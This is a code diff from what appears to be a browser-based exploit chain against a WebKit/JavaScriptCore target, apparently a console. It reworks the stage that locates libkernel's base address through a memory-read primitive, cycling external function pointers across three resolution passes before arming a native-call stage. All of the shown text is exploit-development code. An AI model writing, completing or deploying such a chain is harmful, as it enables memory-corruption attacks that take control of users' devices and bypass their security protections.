@@ -47,14 +47,13 @@ import {
     verifyLibkernelBase,
     extPtrToLkCandidates,
     plausibleHeapCell,
-    resolveExtAlignedKError,
-    resolveMinExtDeepWalk,
+    resolveExtPtrVerifyBounded,
 } from "./libkernel_resolve.js";
 import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, fireGetpid } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250831s";
+const BUILD_ID = "rw-20250831t";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const SCAN_PIVOT_MIN = 0x10000;
@@ -2013,54 +2012,64 @@ function runVerifyLk() {
         mark("LK-SKIP", "bad hex");
         return;
     }
-    let v = verifyLibkernelBase(p, ptr, off, { webkitBase, off });
-    let resolved = null;
-    if (!v.ok) {
-        resolved = tryResolveExtVerifyOne(p, off, webkitBase, hex);
-        if (resolved) {
-            saveLibkernelSession(resolved.lk, resolved.iatRva);
-            if (addrIn) addrIn.value = String(resolved.lk);
-            v = verifyLibkernelBase(p, resolved.lk, off, { fnPtr: parseAddr(hex), webkitBase, off });
-            mark("LK-RESOLVE-OK", hex + " → " + resolved.lk + " via " + resolved.via);
-        } else {
-            mark("LK-RESOLVE-MISS", hex + " pass=" + (extResolveIdx % 2 ? "walk8" : "align-k3"));
-        }
-    }
-    const lkBase = resolved ? resolved.lk : ptr;
-    if (v.ok && v.strong) {
-        saveLibkernelSession(lkBase, null);
-        mark("LK-VERIFY-OK", String(lkBase) + " stub+" + v.stubOff.toString(16) + " build=" + BUILD_ID);
-        state("lk verified — Arm → Fire", "ok");
-    } else if (v.ok) {
-        saveLibkernelSession(lkBase, null);
-        mark("LK-VERIFY-WARN", String(lkBase) + " " + (v.warn || "weak"));
-        state("weak lk — Force lk → Arm → Fire", "warn");
-    } else {
-        mark("LK-VERIFY-BAD", v.error || "bad");
-        cycleExtPtrInHex();
-        state("verify fail — hex advanced to next ext ptr", "bad");
-    }
-    renderOut();
-    crashLog.append("VERIFY " + (v.ok ? "OK" : "FAIL") + " " + hex, "LK-VERIFY");
-    crashLog.flushSync();
-}
 
-/** Verify lk only — finish phase does zero reads (wk-near OOMs on HW). */
-function tryResolveExtVerifyOne(p, off, webkitBase, hex) {
-    if (!p || !hex) return null;
-    const fn = parseAddr(hex);
-    if (!fn) return null;
-    const pass = extResolveIdx % 2;
-    if (pass === 0) {
-        return resolveExtAlignedKError(p, fn, off, webkitBase, {
-            maxKErrors: 3,
-            strongOnly: true,
-            pageAlignOnly: true,
-        });
+    const passNames = ["error8", "page2", "walk16"];
+    const pass = extResolveIdx % passNames.length;
+    const isAlignedBase = (ptr.low & 0x3fff) === 0;
+
+    if (isAlignedBase) {
+        const vBase = verifyLibkernelBase(p, ptr, off, { webkitBase, off });
+        if (vBase.ok && vBase.strong) {
+            saveLibkernelSession(ptr, null);
+            mark("LK-VERIFY-OK", String(ptr) + " stub+" + vBase.stubOff.toString(16) + " build=" + BUILD_ID);
+            state("lk verified — Arm → Fire", "ok");
+            renderOut();
+            crashLog.append("VERIFY OK " + hex, "LK-VERIFY");
+            crashLog.flushSync();
+            return;
+        }
+        if (vBase.ok) {
+            saveLibkernelSession(ptr, null);
+            mark("LK-VERIFY-WARN", String(ptr) + " " + (vBase.warn || "weak"));
+            state("weak lk — Force lk → Arm → Fire", "warn");
+            renderOut();
+            crashLog.flushSync();
+            return;
+        }
+    } else {
+        mark("LK-EXT-FN", hex + " import ptr — pass=" + passNames[pass]);
     }
-    const deep = resolveMinExtDeepWalk(p, [hex], off, webkitBase, 8);
-    if (deep && deep.lk) return deep;
-    return null;
+
+    const resolved = resolveExtPtrVerifyBounded(p, ptr, off, webkitBase, pass);
+    if (resolved) {
+        saveLibkernelSession(resolved.lk, resolved.iatRva);
+        if (addrIn) addrIn.value = String(resolved.lk);
+        const v = verifyLibkernelBase(p, resolved.lk, off, { fnPtr: ptr, webkitBase, off });
+        const kLog = resolved.k__error != null ? " k=0x" + resolved.k__error.toString(16) : "";
+        if (v.ok && v.strong) {
+            mark("LK-VERIFY-OK", String(resolved.lk) + " via " + resolved.via + kLog + " build=" + BUILD_ID);
+            state("lk verified — Arm → Fire", "ok");
+        } else if (v.ok) {
+            mark("LK-VERIFY-WARN", String(resolved.lk) + " via " + resolved.via + kLog + " — " + (v.warn || "weak"));
+            state("weak lk — Force lk → Arm → Fire", "warn");
+        } else {
+            mark("LK-VERIFY-WARN", String(resolved.lk) + " via " + resolved.via + kLog + " — prologue only");
+            state("weak lk — Force lk → Arm → Fire", "warn");
+        }
+        mark("LK-RESOLVE-OK", hex + " → " + resolved.lk + " via " + resolved.via + kLog);
+        renderOut();
+        crashLog.append("VERIFY OK " + hex + " → " + resolved.lk, "LK-VERIFY");
+        crashLog.flushSync();
+        return;
+    }
+
+    const pageK = Number(ptrBig(ptr) - ptrBig(new int64((ptr.low >>> 0) & ~0x3fff, ptr.hi >>> 0)));
+    mark("LK-RESOLVE-MISS", hex + " pass=" + passNames[pass] + " page+k=0x" + pageK.toString(16));
+    cycleExtPtrInHex();
+    state("verify miss — tap again (cycles ptr + pass)", "bad");
+    renderOut();
+    crashLog.append("VERIFY FAIL " + hex + " " + passNames[pass], "LK-VERIFY");
+    crashLog.flushSync();
 }
 
 let extResolveIdx = 0;
@@ -2169,7 +2178,7 @@ function finishFindLkChunk(chunk) {
             crashLog.flushSync();
 
             if (addrIn && hexes[0]) addrIn.value = hexes[0];
-            mark("LK-HINT", "Verify lk cycles ext ptrs — align-k / walk8");
+            mark("LK-HINT", "Verify lk — ext fn ptrs (3 passes: error8/page2/walk16)");
             mark("LK-MISS", "ext saved — zero finish reads build=" + BUILD_ID);
         } else if (chunk.cells === 0) {
             mark("LK-HINT", "no cells — re-run Start");
